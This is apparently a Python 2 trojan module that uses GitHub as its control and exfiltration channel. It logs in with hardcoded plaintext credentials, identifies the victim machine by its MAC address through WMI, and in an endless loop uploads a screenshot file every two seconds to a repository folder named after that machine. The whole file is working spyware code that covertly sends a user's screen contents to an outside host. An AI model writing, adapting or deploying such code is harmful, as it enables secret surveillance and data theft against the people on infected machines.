import json
import base64
import sys
import time
import imp
import random
import threading
import Queue
import os
import wmi
import pythoncom

from github3 import *


def connect_to_github():
    gh = login(username="OXVyeah", password="heiya233")
    #print(gh)
    repo = gh.repository("OXVyeah", "TROyeah")
    return repo

def network(): 
    c = wmi.WMI ()
    for interface in c.Win32_NetworkAdapterConfiguration (IPEnabled=1): 
        print "MAC: %s" % interface.MACAddress 
        return str(interface.MACAddress).replace(":","-")


def upScreen(rep,msg,pcname):
    if rep.contents("data/"+pcname+"/screen.bmp") == None :
#	print "ip"
        rep.create_file("data/"+pcname+"/screen.bmp",pcname +" screen autosave file create",msg)
    con = rep.contents("data/"+pcname+"/screen.bmp")

    upFile(con,msg,"upload screen")


#
def upFile(oricon,msg,comment):
    if oricon == None : print "dont have such file\n" ;return;
    oricon.update(comment,msg)


def run(m):
    pythoncom.CoInitialize()
    repo=connect_to_github()
    fileHandle = None
    while True :
        print "write"
        time.sleep(2)
        fileHandle=open ("C:/pyworks/scr/scr.bmp", 'rb' )
        msg = fileHandle.read()
        upScreen(repo,msg,m)
fileHandle.close()
